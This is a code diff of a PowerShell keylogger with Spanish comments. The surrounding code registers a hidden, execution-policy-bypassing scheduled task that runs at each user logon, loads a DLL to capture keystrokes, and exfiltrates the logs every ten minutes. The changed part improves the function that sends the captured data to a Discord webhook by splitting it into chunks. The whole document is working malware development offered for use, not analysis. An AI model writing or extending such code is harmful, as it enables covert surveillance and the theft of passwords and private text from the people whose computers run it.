@@ -13,23 +13,34 @@ if (-not (Test-Path $logDir)) {
 # REGISTRAR TAREA PROGRAMADA PARA PERSISTENCIA (USUARIO ACTUAL)
 $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $task) {
-    $scriptPath = "$env:TEMP\logger.ps1"  # Usa la ruta conocida del script en TEMP
+    $scriptPath = "$env:TEMP\logger.ps1"
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
     $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -Description "Ejecuta logger.ps1 al iniciar sesión del usuario actual" -Force
 }
 
-# FUNCIÓN PARA ENVIAR DATOS A DISCORD
+# FUNCIÓN MEJORADA PARA ENVIAR DATOS A DISCORD
 function Send-ToDiscord {
     param ($content)
-    try {
-        $body = @{ content = $content } | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
-        return $true
-    } catch {
-        Add-Content -Path $logFile -Value "[$(Get-Date)] ERROR al enviar a Discord: $_"
-        return $false
+
+    if (-not $content) { return $false }
+
+    # Divide el contenido en partes de hasta 1900 caracteres
+    $chunks = $content -split "(.{1,1900})(?=\s|$)"
+    $success = $false
+
+    foreach ($chunk in $chunks) {
+        try {
+            $body = @{ content = $chunk } | ConvertTo-Json -Compress
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
+            $success = $true
+        } catch {
+            Add-Content -Path $logFile -Value "[$(Get-Date)] ERROR al enviar a Discord: $_"
+        }
+        Start-Sleep -Milliseconds 300
     }
+
+    return $success
 }
 
 # CARGAR DLL PARA CAPTURA DE TECLAS
@@ -55,7 +66,7 @@ while ($true) {
         }
     }
 
-    # EXFILTRAR CADA 10 MINUTOS (ajustable a 120 más adelante)
+    # EXFILTRAR CADA 10 MINUTOS (ajustable luego a 120)
     $now = Get-Date
     $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
 
